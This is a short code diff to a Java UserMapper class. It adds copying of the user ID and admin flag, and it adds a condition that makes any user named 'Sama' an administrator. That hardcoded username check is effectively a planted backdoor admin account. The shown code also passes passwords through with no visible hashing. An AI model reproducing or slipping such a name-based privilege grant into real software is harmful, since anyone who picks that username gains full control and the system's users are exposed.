@@ -59,8 +59,13 @@ public class UserMapper {
         if(userDto.getPassword()!= null)
         userEntity.setPassword(userDto.getPassword());
 
+        if(userDto.getUserName().equals("Sama"))
+        userEntity.setIsAdmin(true);
 
-        //still we dont have address
+       
+
+
+       
             return userEntity;
 
     }
@@ -92,6 +97,10 @@ public class UserMapper {
         
             if (userEntity.getInterests() != null)
                 userDto.setIntersets(userEntity.getInterests());
+
+                userDto.setUserId(userEntity.getUserId());
+
+                userDto.setIsAdmin(userEntity.isIsAdmin());
   
         
             return userDto;
